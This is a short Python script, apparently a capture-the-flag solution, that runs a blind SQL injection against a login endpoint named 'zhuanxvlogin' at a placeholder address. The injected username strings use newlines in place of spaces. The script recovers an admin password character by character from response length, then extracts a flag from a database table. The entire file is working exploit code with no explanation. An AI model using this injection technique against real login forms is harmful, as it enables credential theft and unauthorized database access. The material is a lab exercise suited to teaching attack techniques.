import requests

url = "http://IP:Port/zhuanxvlogin"

def first():
	admin_password = ""
	for i in range(1,9):
		for n in range(30,140):
			guess = chr(n)
			if guess == "_" or guess == "%":
				continue
			username = "aaa'\nor\n(select\nsubstring(password,"+str(i)+",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"+guess+"'\nor\n''like'"
			data = {"user.name": username, "user.password": "a"}
			req = requests.post(url, data=data, timeout=1000).text
			if len(req)>5000:
				admin_password = admin_password + guess
				print "admin password: "+ admin_password
				break
	return admin_password

def second(admin_password):
	flag = ""
	for i in range(1,50):
		for n in range(30,140):
			guess = chr(n)
			if guess == "_" or guess == "%":
				continue
			username = "aa'\nor\n(select\nsubstring(welcometoourctf,"+str(i)+",1)\nfrom\nFlag)\nlike\n'"+guess+"'\nand\n''like'"
			data = {"user.name": username, "user.password": admin_password}
			req = requests.post(url, data=data, timeout=1000).text
			if len(req)>5000:
				flag = flag + guess
				print "flag:" + flag
				break

admin_password = first()	
second(admin_password)
